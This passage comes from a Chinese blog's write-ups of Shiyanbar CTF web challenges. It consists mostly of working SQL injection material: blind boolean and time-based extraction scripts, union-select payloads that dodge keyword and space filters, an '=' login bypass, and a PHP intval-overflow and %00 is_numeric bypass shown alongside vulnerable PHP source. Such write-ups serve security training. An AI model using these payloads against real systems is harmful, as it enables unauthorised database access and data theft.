class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='fiag'))from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of column_name is: "</span>+j)</span><br><span class="line">            column_name = column_name + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"column_name: "</span>+column_name)</span><br><span class="line"><span class="comment">#获取数据:flag&#123;haha~you win!&#125;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((select(fL$4G)from(fiag))from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of flag is: "</span>+j)</span><br><span class="line">            flag = flag + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"flag: "</span>+flag)</span><br></pre></td></tr></table></figure><h3 id="你真的会PHP吗"><a href="#你真的会PHP吗" class="headerlink" title="你真的会PHP吗"></a>你真的会PHP吗</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/PHP/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/PHP/index.php</a></p><p>抓包发现响应包头部存在提示字段：hint: 6c525af4059b4fe7d8c33a.txt</p><p>访问得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;number&apos;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure><p>审计，整理思路，列出主要代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>1.首先必须POST参数number，然后得到关键参数$_REQUEST[‘number’]和$req[‘number’]，$req[‘number’]是通过数组POST遍历获得</p><p>2.$_REQUEST[‘number’]不能是一个数字字符串，且$req[‘number’]通过intval函数取整形值后再转换成字符串必须等于原本的$req[‘number’]</p><p>3.$req[‘number’]通过intval函数取整形值必须等于$req[‘number’]通过strrev函数取回文字符串后再通过intval函数取整形值</p><p>4.$req[‘number’]通过is_palindrome_number函数检测不能是一个回文数</p><p>首先考虑思路的第二步，不能是数字字符串，但是却取整形值后要等于原来的值，看似不可能，但是我们可以通过%00截断is_numeric函数</p><p>接下来考虑思路的第三步和第四步，前后检测是否为回文数明显矛盾，这里解决方法是利用intval函数的溢出</p><p>参考别人的题解里的一句话：intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。<br>举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。</p><p>64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件</p><p>所以赋值number=2147483647%00即可获得flag</p><p>我们可以在本地环境测试一下，给出我本地测试的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;flag&#123;xxxxxxxxxx&#125;&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&apos;number&apos;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_GET] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">echo &quot;\$_REQUEST[&apos;number&apos;] = &quot;.$_REQUEST[&apos;number&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;\$req[&apos;number&apos;] = &quot;.$req[&apos;number&apos;].&apos;&lt;br&gt;&apos;; </span><br><span class="line">echo &quot;is_numeric(\$_REQUEST[&apos;number&apos;]) = &quot;.is_numeric($_REQUEST[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;intval(\$req[&apos;number&apos;]): &quot;.intval($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;\$value1 = intval(\$req[&apos;number&apos;]) = &quot;.intval($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;strrev(\$req[&apos;number&apos;]) = &quot;.strrev($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;\$value2 = intval(strrev(\$req[&apos;number&apos;])) = &quot;.intval(strrev($req[&quot;number&quot;])).&apos;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>赋值number=2147483647%00</p><p>执行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到%00成功截断了函数is_numeric，而intval函数会忽略%00，所以strval的值等于原来的值，思路的第二步成功</p><p>再看$req[‘number’]通过strrev函数处理的结果是7463847412，但是再经过intval函数处理结果依旧是原来的2147483647，这就是intval函数溢出，因为2147483647已经是最大值了，大于这个最大值的数经过intval函数处理都是2147483647，而2147483647经过is_palindrome_number函数处理一定返回false，因为它本来就不是回文数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最终获得的flag</p><h3 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h3><p>不要怀疑，我已经过滤了一切,还再逼你注入，哈哈哈哈哈!</p><p>flag格式：ctf{xxxx}</p><p>解题链接：<a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a> </p><p>考察SQL注入，猜测后台SQL如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$password'</span></span><br></pre></td></tr></table></figure><p>尝试使用： <strong>‘=’</strong> ，SQL语句就变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">''</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">''</span>=<span class="string">''</span></span><br></pre></td></tr></table></figure><p>按照逻辑，从左往右： <strong>username=’’</strong>  然后 <strong>‘’=’’</strong> 为真，<strong>password</strong> 也一样，类似下面：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/36.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以我们账号和密码都填 <strong>‘=’</strong> ，即可获得flag。</p><h3 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h3><p>我要把攻击我的人都记录db中去!</p><p>解题链接：<a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/index.php</a> </p><p>发现题目会记录用户的IP地址，并记录到数据库中，那么我们就想到使用 <strong>HTTP</strong> 数据包头部的 <strong>X-Forwarded-For</strong> 字段伪造IP，进行 <strong>SQL</strong> 注入。尝试使用 <strong>payload</strong> ： <strong>1’ and sleep(3) and ‘1</strong> ，发现成功执行。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接下来，我们使用 <strong>payload</strong> ： <strong>1’ and if(substr((select flag from flag),1,1),sleep(3),0) and ‘1</strong> ，发现逗号被过滤了：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么我们可以换成下面这种结构： <strong>1’ and (select case when substr((select flag from flag) from 1 for 1)=’c’ then sleep(3) else 0 end) and ‘1</strong><br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/39.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure></p><p>接下来编写脚本跑一下就行了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></span><br><span class="line">chars = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> chars:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span> : <span class="string">"1' and (select case when substr((select flag from flag) from %s for 1)='%s' then sleep(5) else 0 end) and '1"</span> % (i,ch)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += ch</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span>(ch == <span class="string">"&#125;"</span>):</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这题flag为：<strong>ctf{cdbf14c9551d5be5612f7bb5d2867853}</strong> 因为网络非常不稳定，直接给出flag。</p><h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>网址：<a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/</a></p><p>注入点为id,数字型注入，过滤了注释符#，–+，id被单引号包裹</p><p>此外还过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union ,select ,order ,by ,table_schema,column_name,information_schema.columns</span><br></pre></td></tr></table></figure><p>用行注释符代替空格，就不用去考虑过滤的问题，再想办法构造where ‘1，或者select 1 ‘ 闭合最后的单引号</p><p>爆数据库payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/database()/**/%27</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/ttable_schemaable_schema=%27web1</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/ccolumn_nameolumn_name/**/from/**/infinformation_schema.columnsormation_schema.columns/**/where/**/table_name=%27flag</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/flag/**/from/**/flag/**/where/**/%271</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="简单的sql注入之2"><a href="#简单的sql注入之2" class="headerlink" title="简单的sql注入之2"></a>简单的sql注入之2</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/index_2.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php</a></p><p>同样注入点是id，数字型注入，过滤了空格，用行注释符代替即可</p><p>爆库payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/database()/**/%23</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=%27web1</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=%27flag</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/flag/**/from/**/flag/**/%23</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/index_3.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php</a></p><p>有查询结果返回hello，无结果则不返回，有报错信息，但是过滤了extractvalue和updatexml，所以选择用基于布尔的盲注</p><p>python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">all_string = <span class="string">'''qwertyuiopasdfghjklzxcvbnm&#123;&#125;QWERTYUIOPASDFGHJKLZXCVBNM@_1234567890 '''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="comment">#数据库名:web1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1,100):</span></span><br><span class="line"><span class="string">for j in all_string:</span></span><br><span class="line"><span class="string">f = 0</span></span><br><span class="line"><span class="string">print('checking '+j)</span></span><br><span class="line"><span class="string">url = "http://ctf5.shiyanbar.com/web/index_3.php?id=1' and ascii(substr((select database()),%s,1))=%s--+"%(str(i),ord(j))</span></span><br><span class="line"><span class="string">r = requests.get(url)</span></span><br><span class="line"><span class="string">if "Hello!" in r.text:</span></span><br><span class="line"><span class="string">print('The '+str(i)+' place of database is: '+j)</span></span><br><span class="line"><span class="string">database = database + j</span></span><br><span class="line"><span class="string">f = 1</span></span><br><span class="line"><span class="string">break</span></span><br><span class="line"><span class="string">if f == 0 and j == '?':</span></span><br><span class="line"><span class="string">break</span></span><br><span class="line"><span class="string">print('database: '+database)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#flag:</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">print(<span class="string">'checking '</span>+j)</span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and ascii(substr((select flag from flag),%s,1))=%s--+"</span>%(str(i),ord(j))</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Hello!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">'The '</span>+str(i)+<span class="string">' place of flag is: '</span>+j)</span><br><span class="line">flag = flag + j</span><br><span class="line">f = <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">' '</span>:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/pcat/index.php" 